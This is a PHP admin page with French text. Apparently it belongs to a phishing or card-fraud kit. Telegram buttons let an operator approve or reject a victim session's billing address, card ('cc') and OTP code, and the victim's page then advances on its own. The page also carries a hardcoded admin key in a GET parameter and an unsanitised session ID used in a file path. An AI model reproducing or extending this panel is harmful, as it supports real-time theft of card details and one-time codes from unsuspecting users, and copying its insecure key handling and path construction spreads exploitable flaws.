<?php
/**
 * Page d'action admin - SIMPLE
 * Appelée quand on clique sur les boutons Telegram
 */

// Vérifier la clé admin
$adminKey = 'Passe120.';
$providedKey = $_GET['key'] ?? '';

if ($providedKey !== $adminKey) {
    die('❌ Accès refusé');
}

// Récupérer les paramètres
$sessionId = $_GET['session'] ?? '';
$type = $_GET['type'] ?? '';
$action = $_GET['action'] ?? '';

if (empty($sessionId) || empty($type) || empty($action)) {
    die('❌ Paramètres manquants');
}

// Dossier status
$statusDir = __DIR__ . '/status';
if (!is_dir($statusDir)) {
    @mkdir($statusDir, 0755, true);
}

$statusFile = "$statusDir/$sessionId.txt";

// Déterminer le nouveau statut
if ($action === 'approve') {
    $newStatus = "approved_{$type}";
    $emoji = '✅';
    $message = $type === 'billing' ? 'Adresse approuvée' : ($type === 'cc' ? 'Carte approuvée → OTP' : 'OTP approuvé → Succès');
} else {
    $newStatus = "rejected_{$type}";
    $emoji = '❌';
    $message = $type === 'billing' ? 'Adresse refusée' : ($type === 'cc' ? 'Carte refusée' : 'OTP refusé');
}

// Écrire le statut
$result = @file_put_contents($statusFile, $newStatus);

// Logger l'action
$logsDir = __DIR__ . '/logs';
if (!is_dir($logsDir)) {
    @mkdir($logsDir, 0755, true);
}

$logData = date('Y-m-d H:i:s') . " | Action: $action | Type: $type | Session: $sessionId | Status: $newStatus\n";
@file_put_contents("$logsDir/admin_actions.log", $logData, FILE_APPEND | LOCK_EX);

?><!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title><?php echo $emoji; ?> Action effectuée</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:system-ui,-apple-system,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;color:#fff;}
.card{background:rgba(255,255,255,0.95);color:#333;padding:40px;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,0.3);text-align:center;max-width:400px;width:90%;}
.emoji{font-size:80px;margin-bottom:20px;animation:bounce 0.6s;}
h1{font-size:24px;margin-bottom:10px;color:#333;}
p{color:#666;font-size:16px;margin-bottom:30px;}
.info{background:#f5f5f5;padding:15px;border-radius:10px;margin-bottom:20px;font-size:14px;}
.info div{margin:5px 0;}
.info strong{color:#333;}
.btn{display:inline-block;padding:12px 30px;background:#667eea;color:#fff;text-decoration:none;border-radius:25px;font-weight:600;transition:all 0.3s;}
.btn:hover{background:#764ba2;transform:translateY(-2px);box-shadow:0 4px 12px rgba(0,0,0,0.2);}
@keyframes bounce{0%,100%{transform:translateY(0);}50%{transform:translateY(-20px);}}
</style>
</head>
<body>
<div class="card">
    <div class="emoji"><?php echo $emoji; ?></div>
    <h1><?php echo $message; ?></h1>
    <p>Action effectuée avec succès</p>

    <div class="info">
        <div><strong>Session:</strong> <?php echo htmlspecialchars($sessionId); ?></div>
        <div><strong>Type:</strong> <?php echo htmlspecialchars($type); ?></div>
        <div><strong>Statut:</strong> <?php echo htmlspecialchars($newStatus); ?></div>
    </div>

    <p style="font-size:14px;color:#999;">L'utilisateur a été automatiquement redirigé.</p>

    <a href="javascript:window.close()" class="btn">Fermer</a>
</div>
</body>
</html>
